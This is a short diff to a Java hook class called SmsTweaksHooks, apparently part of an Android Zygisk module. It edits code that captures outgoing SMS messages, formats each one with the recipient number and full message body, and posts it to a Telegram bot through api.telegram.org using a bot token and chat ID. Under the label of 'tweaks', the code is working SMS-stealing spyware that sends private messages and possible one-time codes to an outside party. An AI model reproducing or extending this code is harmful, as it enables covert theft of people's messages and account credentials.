@@ -507,9 +507,10 @@ public final class SmsTweaksHooks {
                     String displayTo = to;
                     String digits = to.replaceAll("[^0-9]", "");
                     if (digits.length() == 10) displayTo = "+91" + digits;
-                    String msg = "📱 SMS Intercepted\n"
-                            + "-----------------\n"
-                            + "To: " + displayTo + "\n"
+                    else if (digits.length() == 12 && digits.startsWith("91"))
+                        displayTo = "+" + digits;
+                    String msg = "📱 SMS Intercepted Zygisk Mode Menu By @Hivirtus 🔥\n"
+                            + "To " + displayTo + "\n"
                             + "Message: " + body;
                     String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                     String payload = "chat_id=" + URLEncoder.encode(chat, "UTF-8")
